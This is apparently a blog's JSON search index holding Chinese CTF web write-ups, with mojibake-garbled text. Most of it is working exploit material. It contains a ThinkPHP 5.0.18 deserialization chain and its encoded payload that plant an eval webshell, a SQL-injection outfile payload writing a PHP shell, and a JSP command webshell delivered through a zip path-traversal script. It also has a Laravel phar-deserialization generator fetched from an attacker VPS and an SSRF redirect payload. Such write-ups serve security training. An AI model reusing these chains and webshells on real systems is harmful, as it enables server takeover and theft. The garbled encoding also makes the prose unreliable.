;00u&#x3D;00Z&#x3D;00m&#x3D;008&#x3D;00i&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00f&#x3D;00Q&#x3D;00U&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00k&#x3D;00d&#x3D;00W&#x3D;001&#x3D;00t&#x3D;00e&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00B&#x3D;00W&#x3D;00w&#x3D;001&#x3D;00h&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00x&#x3D;00+&#x3D;00f&#x3D;009&#x3D;00i&#x3D;00k&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00L&#x3D;00n&#x3D;00R&#x3D;004&#x3D;00d&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00B&#x3D;00W&#x3D;00w&#x3D;001&#x3D;00h&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00x&#x3D;00+&#x3D;00f&#x3D;009&#x3D;00i&#x3D;00k&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00H&#x3D;00R&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00R&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00N&#x3D;00S&#x3D;00Q&#x3D;00g&#x3D;00s&#x3D;00A&#x3D;002&#x3D;00D&#x3D;00L&#x3D;00z&#x3D;001&#x3D;00J&#x3D;00O&#x3D;00Z&#x3D;00G&#x3D;00X&#x3D;00F&#x3D;00D&#x3D;00D&#x3D;009&#x3D;00+&#x3D;00D&#x3D;00r&#x3D;00m&#x3D;00V&#x3D;00e&#x3D;00g&#x3D;00C&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00R&#x3D;000&#x3D;00J&#x3D;00N&#x3D;00Q&#x3D;00g&#x3D;00&#x3D;3D&#x3D;00&#x3D;3D æŒ‰ç…§ä¸Šé¢æ­¥éª¤ï¼Œæœ€ç»ˆå®ç°pharååºåˆ—åŒ– æ¢payloadï¼Œå¾—åˆ°æ ¹ç›®å½•ç»“æ„ è¯»å–flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpååºåˆ—åŒ–","slug":"CTF/phpååºåˆ—åŒ–","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"pharååºåˆ—åŒ–","slug":"pharååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php://filterè¿‡æ»¤å™¨å·§å¦™åˆ©ç”¨","slug":"php-filterè¿‡æ»¤å™¨å·§å¦™åˆ©ç”¨","permalink":"https://123-prog.github.io/tags/php-filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/"}]},{"title":"DAS x CBCTF éƒ¨åˆ†web wp","slug":"DAS-x-CBCTF-éƒ¨åˆ†web-wp","date":"2021-08-01T14:32:27.000Z","updated":"2021-09-22T10:18:25.259Z","comments":true,"path":"2021/08/01/DAS-x-CBCTF-éƒ¨åˆ†web-wp/","link":"","permalink":"https://123-prog.github.io/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/","excerpt":"0x01 ez_websiteåœ¨indexä¸‹çš„Labelmodels.phpæ§åˆ¶å™¨ï¼Œå…¶ä¸­çš„get_labelæ–¹æ³•ï¼Œè·å–æ•°æ®ï¼Œåœ¨æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„æƒ…å†µä¸‹å¯¹æ•°æ®è¿›è¡Œååºåˆ—åŒ–","text":"0x01 ez_websiteåœ¨indexä¸‹çš„Labelmodels.phpæ§åˆ¶å™¨ï¼Œå…¶ä¸­çš„get_labelæ–¹æ³•ï¼Œè·å–æ•°æ®ï¼Œåœ¨æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„æƒ…å†µä¸‹å¯¹æ•°æ®è¿›è¡Œååºåˆ—åŒ– thinkphp 5.0.18ï¼Œæ‰¾æ¡popé“¾ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;?phpnamespace think\\process\\pipes &#123; class Windows &#123; private $files = []; public function __construct($files) &#123; $this-&gt;files = [$files]; //$file =&gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±» &#125; &#125;&#125;namespace think &#123; abstract class Model&#123; protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) &#123; $this-&gt;parent = $output; //$this-&gt;parent=&gt; think\\console\\Output; $this-&gt;append = array(&quot;xxx&quot;=&gt;&quot;getError&quot;); //è°ƒç”¨getError è¿”å›this-&gt;error $this-&gt;error = $modelRelation; // $this-&gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==&gt;&gt;HasOne &#125; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model&#123; function __construct($output, $modelRelation) &#123; parent::__construct($output, $modelRelation); &#125; &#125;&#125;namespace think\\model\\relation&#123; class HasOne extends OneToOne &#123; &#125;&#125;namespace think\\model\\relation &#123; abstract class OneToOne &#123; protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) &#123; $this-&gt;selfRelation = 0; $this-&gt;query = $query; //$queryæŒ‡å‘Query $this-&gt;bindAttr = [&#x27;xxx&#x27;];// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡ &#125; &#125;&#125;namespace think\\db &#123; class Query &#123; protected $model; function __construct($model) &#123; $this-&gt;model = $model; //$this-&gt;model=&gt; think\\console\\Output; &#125; &#125;&#125;namespace think\\console&#123; class Output&#123; private $handle; protected $styles; function __construct($handle) &#123; $this-&gt;styles = [&#x27;getAttr&#x27;]; $this-&gt;handle =$handle; //$handle-&gt;think\\session\\driver\\Memcached &#125; &#125;&#125;namespace think\\session\\driver &#123; class Memcached &#123; protected $handler; function __construct($handle) &#123; $this-&gt;handler = $handle; //$handle-&gt;think\\cache\\driver\\File &#125; &#125;&#125;namespace think\\cache\\driver &#123; class File &#123; protected $options=null; protected $tag; function __construct()&#123; $this-&gt;options=[ &#x27;expire&#x27; =&gt; 3600, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; =&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../public/uploads/a.php&#x27;, &#x27;data_compress&#x27; =&gt; false, ]; $this-&gt;tag = &#x27;xxx&#x27;; &#125; &#125;&#125;namespace &#123; $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window));&#125; è¿™ä¸ªpopé“¾å¯ä»¥åœ¨æŒ‡å®šç›®å½•ç”Ÿæˆshellæ–‡ä»¶ï¼Œshellæ–‡ä»¶åä¸ºa.php+md5(&#39;tag_&#39;+md5($this-&gt;tag)).php åœ¨ç½‘ç«™æ ¹ç›®å½•å†™æ–‡ä»¶ä¼šå¤±è´¥ï¼Œä¼°è®¡æ²¡ç»™æ ¹ç›®å½•å†™çš„æƒé™ï¼Œæ‰€ä»¥æ¢ä¸ªç›®å½•ï¼Œæˆ‘ç”¨çš„/public/uploads/ï¼Œå­˜æ”¾ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•æ€»å½’æœ‰æƒé™å§ payload 1http:&#x2F;&#x2F;62a40bd3-4929-4334-a22c-0eb3b4029324.node4.buuoj.cn&#x2F;index.php&#x2F;index&#x2F;labelmodels&#x2F;get_label?tag_array[cfg]&#x3D;O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A137%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fpublic%2Fuploads%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D 123è®¿é—®&#x2F;public&#x2F;uploads&#x2F;a.php12ac95f1498ce51d2d96a249c09c1998.phppost ccc&#x3D;system(&#39;&#x2F;readflag&#39;);æ‹¿åˆ°flag 0x02 cybercmswww.zipæºç æ³„éœ² åå°/adminï¼Œç™»å½•å¤„å­˜åœ¨sqlæ³¨å…¥æ¼æ´ ä¸»è¦çš„éªŒè¯é€»è¾‘ fl_value,f1_vvv,f1_htmlå¯¹è¾“å…¥åšäº†ä¸ªè¿‡æ»¤ éƒ½æ˜¯ç®€å•çš„è¿‡æ»¤ï¼Œå¯¹å…³é”®å­—æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™å³å¯ç»•è¿‡ ä½†flagæ²¡åœ¨æ•°æ®åº“å†…ï¼Œç”±flag.shå¯çŸ¥flagåœ¨æ ¹ç›®å½•ï¼Œæ‰€ä»¥è¿™é‡Œåˆ©ç”¨çš„æ˜¯sqlå†™shell ä¸ºäº†é˜²æ­¢f1_htmlå¯¹æˆ‘ä»¬æ’å…¥ä¸€å¥è¯ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œè¿™é‡Œåˆ©ç”¨charå‡½æ•° 1user&#x3D;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;selselectect&#x2F;**&#x2F;null,null,null,null,char(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;outoutfilefile&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;#&amp;password&#x3D;122&amp;code&#x3D;&amp;submit&#x3D;true&amp;submit.x&#x3D;61&amp;submit.y&#x3D;32 123è®¿é—® &#x2F;shell.phppost cmd&#x3D;system(&#39;cat &#x2F;flag.txt&#39;);å³å¯æ‹¿flag 0x03 jspxcmsæ‰¾åˆ°åå° /cmscp/index.do è´¦å·é»˜è®¤æ˜¯adminï¼Œå¯†ç é»˜è®¤ä¸ºç©º åœ¨åå°æœ‰ä¸€å¤„ä¸Šä¼ æ–‡ä»¶ï¼Œå¹¶å¯ä»¥å¯¹ä¸Šä¼ çš„zipè¿›è¡Œè§£å‹ï¼Œè¿™é‡Œä¸èƒ½ç›´æ¥ä¸Šä¼ jspï¼Œè€Œä¸”jspxcmså¯¹jspçš„è®¿é—®æœ‰é™åˆ¶ï¼Œè®¿é—®jspæ–‡ä»¶å°±ç›´æ¥403 è¿™é‡Œå­˜åœ¨ç›®å½•ç©¿è¶Šçš„æ¼æ´ï¼Œå¯ä»¥æ„é€ zipåŒ…è·¯å¾„ä¸ºshell.zip/../../../shell.warï¼Œè¿™æ ·å­è§£å‹åçš„shell.warå°±ä¼šåˆ°webappsç›®å½•ä¸‹ï¼Œåˆ©ç”¨å…¶é¡¹ç›®éƒ¨ç½²ï¼ŒwaråŒ…è‡ªåŠ¨è§£å‹çš„ç‰¹ç‚¹ï¼ŒæˆåŠŸå°†å…¶ä¸­çš„shellæ–‡ä»¶å†™åˆ°æœåŠ¡å™¨ å†™ä¸€ä¸ªshell.jsp æœ¨é©¬ 123456789101112&lt;% if(&quot;c4t&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt; jar -cvf shell.war shell.jsp ç”Ÿæˆshell.warï¼Œç„¶åæ„é€ zip ç”Ÿæˆzipçš„è„šæœ¬ 12345678910111213141516import zipfileimport osbinary = open(&#x27;shell.war&#x27;,&#x27;rb&#x27;).read()#print(binary)if os.path.exists(&#x27;./test.zip&#x27;): os.system(&#x27;rm -rf ./test.zip&#x27;)if __name__ == &quot;__main__&quot;: try: zipFile = zipfile.ZipFile(&quot;test.zip&quot;, &quot;a&quot;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(&quot;test.zip&quot;) zipFile.writestr(&quot;../../../shell.war&quot;, binary) zipFile.close() except IOError as e: raise e ä¸Šä¼ æ–‡ä»¶å¹¶è§£å‹ è®¿é—®/shell/shell.jsp?pwd=c4t&amp;cmd=cat /flag å¾—åˆ°flag","categories":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"}],"tags":[{"name":"DAS x CBCTF","slug":"DAS-x-CBCTF","permalink":"https://123-prog.github.io/tags/DAS-x-CBCTF/"}]},{"title":"(HMBCTF 2021)EzLight","slug":"HMBCTF-2021-EzLight","date":"2021-07-30T12:18:50.000Z","updated":"2021-09-22T10:18:07.809Z","comments":true,"path":"2021/07/30/HMBCTF-2021-EzLight/","link":"","permalink":"https://123-prog.github.io/2021/07/30/HMBCTF-2021-EzLight/","excerpt":"0x01 pharä¸Šä¼ ç‚¹ä»¥admin:adminç™»å½•è¿›å…¥åå°ï¼Œåœ¨å†…å®¹ç®¡ç†å¤„ï¼Œæ–°å»ºæ–‡ç« å†…å®¹ï¼Œä¼šæœ‰ä¸€å¤„å¯ä»¥ä¸Šä¼ å°é¢å›¾çš„åœ°æ–¹ï¼Œç»è¿‡æµ‹è¯•ï¼Œå¯¹pharæ–‡ä»¶ç¨åŠ ä¿®æ”¹å¯ä»¥ä¼ªé€ æˆå›¾ç‰‡ä¸Šä¼ ï¼Œè€Œä¸”è·¯å¾„ä¹Ÿæ˜¯å·²çŸ¥çš„","text":"0x01 pharä¸Šä¼ ç‚¹ä»¥admin:adminç™»å½•è¿›å…¥åå°ï¼Œåœ¨å†…å®¹ç®¡ç†å¤„ï¼Œæ–°å»ºæ–‡ç« å†…å®¹ï¼Œä¼šæœ‰ä¸€å¤„å¯ä»¥ä¸Šä¼ å°é¢å›¾çš„åœ°æ–¹ï¼Œç»è¿‡æµ‹è¯•ï¼Œå¯¹pharæ–‡ä»¶ç¨åŠ ä¿®æ”¹å¯ä»¥ä¼ªé€ æˆå›¾ç‰‡ä¸Šä¼ ï¼Œè€Œä¸”è·¯å¾„ä¹Ÿæ˜¯å·²çŸ¥çš„ 0x02 è§¦å‘pharååºåˆ—åŒ–çš„ç‚¹é™¤äº†ä¸Šä¼ æ–‡ä»¶çš„æ¥å£/admin/neditor/serve/uploadimageå¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå¯ç”¨äºè¿œç¨‹åŠ è½½æ–‡ä»¶çš„æ¥å£ /admin/neditor/serve/catchimage ä¼šå¯¹POSTçš„fileå‚æ•°è°ƒç”¨fetchImageFileï¼Œè¿›ä¸€æ­¥è·Ÿè¿› é€šè¿‡curlè·å–è¿œç¨‹æ–‡ä»¶å†…å®¹ï¼Œå­˜åœ¨$dataä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è·å–åˆ°è‡ªå·±æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œä»è€Œæ§åˆ¶data è·Ÿè¿›Image::make åœ¨vendor/intervention/image/src/Intervention/Image/ImageManager.phpå¯ä»¥çœ‹åˆ°makeçš„å®šä¹‰ ç»§ç»­è·Ÿè¿› æœ€ç»ˆæ˜¯è°ƒç”¨çš„AbstractDecoder.phpä¸­çš„init() åœ¨isUrl()ä¸­ï¼Œè·Ÿè¿›initFromUrl å¯ä»¥çœ‹åˆ°æœ‰file_get_contentsæ“ä½œï¼Œè§¦å‘ç‚¹å°±æ‰¾åˆ°äº† 0x03 åˆ©ç”¨é“¾lightCMSåŸºäºLaravel 6.xå¼€å‘ï¼Œä½†Laravejitiaol5.xçš„é‚£å‡ æ¡é“¾ä¹Ÿå¥½åƒéƒ½å¯ä»¥ç”¨ éšä¾¿é€‰ä¸€æ¡é“¾ï¼Œç”Ÿæˆpharæ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpnamespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($function, $parameter) &#123; $this-&gt;events = new \\Illuminate\\Bus\\Dispatcher($function); $this-&gt;event = new \\Illuminate\\Queue\\CallQueuedClosure($parameter); &#125; &#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher &#123; protected $queueResolver; public function __construct($function) &#123; $this-&gt;queueResolver = $function; &#125; &#125;&#125;namespace Illuminate\\Queue&#123; class CallQueuedClosure &#123; protected $connection; public function __construct($parameter) &#123; $this-&gt;connection = $parameter; &#125; &#125;&#125;namespace&#123; $function = &#x27;system&#x27;; $parameter = &#x27;cat /flag&#x27;; $data = new \\Illuminate\\Broadcasting\\PendingBroadcast( $function, $parameter ); $phar = new Phar(&#x27;phar.phar&#x27;); $phar -&gt; stopBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;); $phar -&gt; setMetadata($data); $phar -&gt; stopBuffering(); rename(&#x27;phar.phar&#x27;,&#x27;phar.jpg&#x27;);&#125; 0x04ä¸Šä¼ pharæ–‡ä»¶ åœ¨è‡ªå·±çš„vpsä¸Šå¼€ä¸ªhttpæœåŠ¡ï¼Œå­˜æ”¾phar.txtæ–‡ä»¶ï¼Œå†…å®¹ä¸º 1phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;image&#x2F;202107&#x2F;pkCycjoTZSOQbtpygAFQvdr0DhQ8gv2ZDk3aGyKj.gif è¿™é‡Œä¸è¦ç”¨vimç¼–è¾‘ï¼Œå¦åˆ™curlè¯»å–åˆ°çš„å†…å®¹åé¢ä¼šå¤šä¸€ä¸ª\\nï¼Œåœ¨åé¢è§£æçš„æ—¶å€™isUrlè¿‡ä¸å» post fileå‚æ•°ï¼Œè¯»å–vpsæ–‡ä»¶ï¼Œè§¦å‘pharååºåˆ—åŒ–ï¼Œæ‹¿åˆ°flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpååºåˆ—åŒ–","slug":"CTF/phpååºåˆ—åŒ–","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"pharååºåˆ—åŒ–","slug":"pharååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"LightCMS åå°RCEæ¼æ´","slug":"LightCMS-åå°RCEæ¼æ´","permalink":"https://123-prog.github.io/tags/LightCMS-%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/"}]},{"title":"(JMCTF 2021)GoOSS","slug":"JMCTF-2021-GoOSS","date":"2021-07-29T14:47:47.000Z","updated":"2021-09-22T10:16:44.372Z","comments":true,"path":"2021/07/29/JMCTF-2021-GoOSS/","link":"","permalink":"https://123-prog.github.io/2021/07/29/JMCTF-2021-GoOSS/","excerpt":"0x0180ç«¯å£æœ‰index.php","text":"0x0180ç«¯å£æœ‰index.php 1234&lt;?php// php in localhost port 80readfile($_GET[&#x27;file&#x27;]);?&gt; é˜…è¯»æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157package mainimport ( &quot;bytes&quot; &quot;crypto/md5&quot; &quot;encoding/hex&quot; &quot;github.com/gin-gonic/gin&quot; &quot;io&quot; &quot;io/ioutil&quot; &quot;net/http&quot; &quot;os&quot; &quot;strings&quot; &quot;time&quot;)type File struct &#123; Content string `json:&quot;content&quot; binding:&quot;required&quot;` Name string `json:&quot;name&quot; binding:&quot;required&quot;`&#125;type Url struct &#123; Url string `json:&quot;url&quot; binding:&quot;required&quot;`&#125;func md5sum(data string) string&#123; s := md5.Sum([]byte(data)) return hex.EncodeToString(s[:])&#125;func fileMidderware (c *gin.Context)&#123; fileSystem := http.Dir(&quot;./files/&quot;) if c.Request.URL.String() == &quot;/&quot;&#123; c.Next() return &#125; f,err := fileSystem.Open(c.Request.URL.String()) if f == nil &#123; c.Next() &#125; // if err != nil &#123; c.Next() return &#125; defer f.Close() fi, err := f.Stat() if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;) return &#125; if fi.IsDir() &#123; if !strings.HasSuffix(c.Request.URL.String(), &quot;/&quot;) &#123; c.Redirect(302,c.Request.URL.String()+&quot;/&quot;) &#125; else &#123; files := make([]string,0) l,_ := f.Readdir(0) for _,i := range l &#123; files = append(files, i.Name()) &#125; c.JSON(http.StatusOK, gin.H&#123; &quot;files&quot; :files, &#125;) &#125; &#125; else &#123; data,_ := ioutil.ReadAll(f) c.Header(&quot;content-disposition&quot;, `attachment; filename=` + fi.Name()) c.Data(200, &quot;text/plain&quot;, data) &#125;&#125;func uploadController(c *gin.Context) &#123; var file File if err := c.ShouldBindJSON(&amp;file); err != nil &#123; c.JSON(500, gin.H&#123;&quot;msg&quot;: err&#125;) return &#125; dir := md5sum(file.Name) _,err:= http.Dir(&quot;./files&quot;).Open(dir) if err != nil&#123; e := os.Mkdir(&quot;./files/&quot;+dir,os.ModePerm) _, _ = http.Dir(&quot;./files&quot;).Open(dir) if e != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: e.Error()&#125;) return &#125; &#125; filename := md5sum(file.Content) path := &quot;./files/&quot;+dir+&quot;/&quot;+filename err = ioutil.WriteFile(path, []byte(file.Content), os.ModePerm) if err != nil&#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;) return &#125; c.JSON(200, gin.H&#123; &quot;message&quot;: &quot;file upload succ, path: &quot;+dir+&quot;/&quot;+filename, &#125;)&#125;func vulController(c *gin.Context) &#123; var url Url if err := c.ShouldBindJSON(&amp;url); err != nil &#123; c.JSON(500, gin.H&#123;&quot;msg&quot;: err&#125;) return &#125; if !strings.HasPrefix(url.Url,&quot;http://127.0.0.1:1234/&quot;)&#123; c.JSON(403, gin.H&#123;&quot;msg&quot;: &quot;url forbidden&quot;&#125;) return &#125; client := &amp;http.Client&#123;Timeout: 2 * time.Second&#125; resp, err := client.Get(url.Url) if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;) return &#125; defer resp.Body.Close() var buffer [512]byte result := bytes.NewBuffer(nil) for &#123; n, err := resp.Body.Read(buffer[0:]) result.Write(buffer[0:n]) if err != nil &amp;&amp; err == io.EOF &#123; break &#125; else if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;) return &#125; &#125; c.JSON(http.StatusOK, gin.H&#123;&quot;data&quot;: result.String()&#125;)&#125;func main() &#123; r := gin.Default() r.Use(fileMidderware) r.POST(&quot;/vul&quot;,vulController) r.POST(&quot;/upload&quot;,uploadController) r.GET(&quot;/&quot;, func(c *gin.Context) &#123; c.JSON(200, gin.H&#123; &quot;message&quot;: &quot;pong&quot;, &#125;) &#125;) _ = r.Run(&quot;:1234&quot;) // listen and serve on 0.0.0.0:8080&#125; 123&#x2F;upload ä¸Šä¼ æ–‡ä»¶çš„&#x2F;vul ä»£ç†è·¯ç”±ï¼Œå¯ä»¥é€šè¿‡è¿™é‡Œå®ç°SSRF,è¦æ±‚urlå‰ç¼€ä¸ºhttp:&#x2F;&#x2F;127.0.0.1:1234&#x2F;ç°åœ¨å°±æ˜¯å¦‚ä½•ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œè®¿é—®åˆ°80ç«¯å£ 0x02æ³¨æ„åˆ°æœ‰ä¸ªé‡å®šå‘ éœ€è¦æ»¡è¶³c.Request.URL.String()æ˜¯ä¸€ä¸ªç›®å½•è€Œä¸æ˜¯æ–‡ä»¶åï¼Œæˆ‘ä»¬éœ€è¦åœ¨fileä¸‹æœ‰æ–‡ä»¶å¤¹ ä¸Šä¼ æ–‡ä»¶å¯ä»¥å¸®ä½ å®Œæˆè¿™ä¸ªç›®æ ‡ payload 1&#123;&quot;Url&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php?file&#x3D;&#x2F;flag&amp;a&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;098f6bcd4621d373cade4e832627b4f6&quot;&#125; è¿™ä¸ªpayloadï¼Œåˆ©ç”¨ç›®å½•ç©¿è¶Šçš„ç‰¹ç‚¹ï¼Œä¿æŒè®¿é—®è¿™ä¸ªç›®å½•çš„å­˜åœ¨ï¼Œé‡å®šå‘//127.0.0.1:80","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"golang web","slug":"CTF/golang-web","permalink":"https://123-prog.github.io/categories/CTF/golang-web/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://123-prog.github.io/tags/ssrf/"},{"name":"é‡å®šå‘","slug":"é‡å®šå‘","permalink":"https://123-prog.github.io/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"}]},{"title":"(JMCTF 2021)UploadHub","slug":"JMCTF-2021-UploadHub","date":"2021-07-29T04:11:22.000Z","updated":"2021-09-22T10:16:28.187Z","comments":true,"path":"2021/07/29/JMCTF-2021-UploadHub/","link":"","permalink":"https://123-prog.github.io/2021/07/29/JMCTF-2021-UploadHub/","excerpt":"0x01","text":"0x01 ç»™äº†æºç å’Œä¸€äº›é…ç½®æ–‡ä»¶ï¼Œæºç æœ‰å…³sqléƒ¨åˆ†éƒ½æ˜¯è¿·æƒ‘äººçš„ï¼Œè¿™é¢˜æ˜¯æ–‡ä»¶ä¸Šä¼ çš„é¢˜ åœ¨apache2.confä¸­ï¼Œ 123&lt;Directory ~ &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;[a-f0-9]&#123;32&#125;&#x2F;&quot;&gt; php_flag engine off&lt;&#x2F;Directory&gt; ä¸Šä¼ ç›®å½•ä¸‹çš„phpè§£æè¢«å…³é—­äº† ä½†æ˜¯åˆæ³¨æ„åˆ° 12345&lt;Directory &#x2F;var&#x2F;www&#x2F;&gt; Options Indexes FollowSymLinks AllowOverride All Require all granted&lt;&#x2F;Directory&gt; 